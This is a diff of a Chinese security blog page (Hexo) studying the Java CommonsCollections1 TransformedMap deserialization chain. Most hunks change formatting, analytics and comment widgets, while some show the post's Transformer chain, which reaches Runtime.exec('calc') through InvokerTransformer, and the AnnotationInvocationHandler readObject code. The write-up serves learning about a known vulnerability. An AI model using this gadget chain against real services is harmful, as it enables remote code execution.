@@ -2,10 +2,13 @@
 <html lang=en>
 <head>
     <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="HandheldFriendly" content="True" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=5"
+    />
     <meta name="description" content="*java反序列化宏观思维 开启cc链前，有必要来整理一下一些比较宏观的思维而不是技术细节   本源于传输对象：Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输 在与php比较中认识java Java的反序列化和PHP的反序列化其实有点类似，他">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Java安全5(3)_CC1_TransformedMap">
@@ -14,35 +17,42 @@
 <meta property="og:description" content="*java反序列化宏观思维 开启cc链前，有必要来整理一下一些比较宏观的思维而不是技术细节   本源于传输对象：Jackson和Fastjson这类序列化库，在JSON（XML）的基础上进行改造，通过特定的语法来传递对象；亦或者如RMI，直接使用Java等语言内置的序列化方法，将一个对象转换成一串二进制数据进行传输 在与php比较中认识java Java的反序列化和PHP的反序列化其实有点类似，他">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-11-16T04:03:08.597Z">
-<meta property="article:modified_time" content="2024-11-20T14:35:32.498Z">
+<meta property="article:modified_time" content="2025-02-14T10:52:48.750Z">
 <meta property="article:tag" content="Java安全">
 <meta property="article:tag" content="java反序列化">
-<meta name="twitter:card" content="summary">
-    
-    
+<meta name="twitter:card" content="summary">    
+    <link
+        rel="shortcut icon"
+        href="/images/favicon.ico"
+    />
+       
+    <link
+        rel="icon"
+        type="image/png"
+        href="/images/favicon-192x192.png"
+        sizes="192x192"
+    />
+       
+    <link
+        rel="apple-touch-icon"
+        sizes="180x180"
+        href="/images/apple-touch-icon.png"
+    />
       
-        
-          <link rel="shortcut icon" href="/images/favicon.ico">
-        
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
     <!-- title -->
     <title>Java安全5(3)_CC1_TransformedMap</title>
     <!-- async scripts -->
     <!-- Google Analytics -->
 
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Z6JGRC9FT2"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Z6JGRC9FT2');
+  </script>
 
-    <!-- Umami Analytics -->
+ <!-- Umami Analytics -->
 
 
     <!-- styles -->
@@ -52,10 +62,9 @@
     <!-- persian styles -->
     
     <!-- rss -->
+     
+    <!-- mathjax -->
     
-    
-	<!-- mathjax -->
-	
 <meta name="generator" content="Hexo 7.3.0"></head>
 
 <body class="max-width mx-auto px3 ltr">
@@ -69,8 +78,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -86,7 +93,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" aria-label="Previous post" href="/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/16/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%961_%E5%88%9D%E8%AF%86%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" aria-label="Next post" href="/2024/11/15/Java%E5%AE%89%E5%85%A85(2)_URLDNS%E9%93%BE%E5%85%A5%E9%97%A8/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -229,7 +236,7 @@
 </li>
 <li><p>个人理解</p>
 <ol>
-<li>可以理解为对对象的装饰器，对对象调用给定转换器的transform方法，对对象本身进行操作</li>
+<li>可以理解为对象的装饰器，对象调用给定转换器的transform方法，对对象本身进行操作</li>
 </ol>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Transforms the input object (leaving it unchanged) into some output object.</span></span><br><span class="line"><span class="comment">     * 这里的转换可能include method invokation, returning a constant, cloning and returning the string value</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> input  the object to be transformed, should be left unchanged</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> a transformed object</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> ClassCastException (runtime) if the input is the wrong class</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> IllegalArgumentException (runtime) if the input is invalid</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> FunctorException (runtime) if the transform cannot be completed</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
 </ol>
@@ -352,7 +359,7 @@
 <p>在序列化的时候会报无法序列化的错误。原因就在于Runtime类并没有实现Serializable接口，所以无法序列化</p>
 </blockquote>
 <ol>
-<li><p>p牛的解决方法是: <strong>Class类有实现Serializable接口</strong>，可以进行序列化。那这里通过<strong>反射</strong>来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，实现了从java.lang.Runtime对象到java.lang.Class对象的转变 –&gt; **传递Class对象，然后利用InvokerTransformer调用方法最终获取Runtime对象</p>
+<li><p>p牛的解决方法是: <strong>Class类有实现Serializable接口</strong>，可以进行序列化。那这里通过<strong>反射</strong>来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，实现了从java.lang.Runtime对象到java.lang.Class对象的转变 –&gt; <strong>传递Class对象</strong>，然后利用InvokerTransformer调用方法最终获取Runtime对象</p>
  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 普通反射写法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">f</span> <span class="operator">=</span> Runtime.class.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) f.invoke(<span class="literal">null</span>);</span><br><span class="line">r.exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// cc利用反射写法</span></span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="comment">// 这一个Transformers[]有整整的4个转换器</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),    <span class="comment">// Class对象可以进行反序列化</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h4 id="Q-什么是Annotation类-为什么需要使用Retention-class"><a href="#Q-什么是Annotation类-为什么需要使用Retention-class" class="headerlink" title="Q: 什么是Annotation类?为什么需要使用Retention.class?"></a>Q: 什么是Annotation类?为什么需要使用Retention.class?</h4><ol>
@@ -360,7 +367,7 @@
 <li><p>发现有var7!&#x3D;null -&gt; var3.get(var6) -&gt; var6 &#x3D; (String)var5.getKey(); var3 &#x3D; var2.memberTyes() -&gt; var2 &#x3D; null</p>
   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    var1.defaultReadObject();</span><br><span class="line">    <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">    <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">        <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">        <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
-<li><p>还会涉及到Java注释相关的技术，p牛也不分析，只给出两个结论</p>
+<li><p>还会涉及到Java注释相关的技术，p牛也不分析，只给出两个结论，想具体了解见最Ref最后一篇文章</p>
 <ol>
 <li>sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是Annotation的子类，且其中必须含有至少一个方法，假设方法名是X</li>
 <li>被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素</li>
@@ -423,12 +430,22 @@
 <li><a target="_blank" rel="noopener" href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsCollections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0(%E4%B8%8A).md">信工所的大佬写的文章就是nb</a></li>
 <li><a target="_blank" rel="noopener" href="https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478">cc1_TransformedMap祖师爷</a></li>
 <li><a target="_blank" rel="noopener" href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">长亭科技</a></li>
+<li><a target="_blank" rel="noopener" href="https://d4n-sec.github.io/p/cc1demo/">有针对Retention的</a><ol>
+<li>可以一步一步调试出来的</li>
+</ol>
+</li>
 </ol>
 </li>
 </ol>
 
   </div>
 </article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
 
 
 
@@ -440,8 +457,6 @@
       <ul>
         
           <li><a href="/">Home</a></li>
-        
-          <li><a href="/about/">About</a></li>
         
           <li><a href="/archives/">Writing</a></li>
         
@@ -496,7 +511,7 @@
     Copyright &copy;
     
     
-    2023-2024
+    2023-2025
     KC1zs4&#39;s Blog
   </div>
   <div class="footer-right">
@@ -504,8 +519,6 @@
       <ul>
         <!--
        --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
      --><!--
        --><li><a href="/archives/">Writing</a></li><!--
      --><!--
@@ -609,6 +622,18 @@
 <!-- Cloudflare Analytics -->
 
 <!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'kc1zs4-github-io';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
 
 <!-- utterances Comments -->
 
